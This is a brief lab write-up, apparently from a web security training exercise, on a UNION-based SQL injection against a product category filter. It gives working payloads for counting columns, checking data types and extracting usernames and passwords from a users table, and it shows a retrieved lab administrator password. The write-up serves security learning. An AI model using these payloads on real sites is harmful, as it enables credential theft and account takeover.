# Lab: SQL injection UNION attack, retrieving data from other tables

> SQL Injection - Product Category filter.

End Goal - Output the usernames and passwords in the users table and login as the administrator user.

Analysis
---------------

1. Determin the no of colouns that vuln qurey using
' order by 1--
' order by 2--
' order by 3-- -> internal server error

3-1 = 2

2. Determine the datatype that using

select a,b from products where category='Gifts

' UNION select 'a', NULL-- 
' UNION select 'a', 'a'--
-> both columns are of data type string

' UNION select username, password from users --
```
administrator
uwts5hfac35mvn2ljpxg
```